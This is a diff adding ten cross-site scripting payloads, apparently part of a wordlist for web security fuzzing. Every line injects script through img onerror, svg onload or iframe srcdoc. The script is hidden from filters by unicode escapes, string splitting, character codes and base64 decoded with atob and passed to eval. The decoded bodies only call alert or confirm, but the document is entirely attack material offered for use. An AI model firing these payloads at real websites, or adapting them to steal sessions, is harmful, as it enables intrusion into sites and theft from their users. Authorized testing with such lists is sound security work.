@@ -1,0 +1,10 @@
+<img/src=1 onerror=setTimeout(function(){al\u0065rt('1')})>
+<iframe/srcdoc="<svg onload=confirm(String.fromCharCode(49))>">
+<svg/onload=setTimeout('ale'+'rt(1)',0)>
+<iframe/srcdoc="<svg onload=eval(atob('Y29uZmlybSgxKQ=='))>">
+<svg/onload=eval('co'+'nfirm(1)')>
+<svg/onload=eval('al'+'ert(1)')>
+<iframe/srcdoc="<svg onload=eval(atob('YWxlcnQoJzEnKQ=='))>">
+<svg/onload=eval(atob('Y29uZmlybSgxKQ=='))>
+<iframe/srcdoc="<img src=1 onerror=eval(atob('YWxlcnQoJzEnKQ=='))>">
+<svg/onload=eval(atob('YWxlcnQoJzEnKQ=='))>
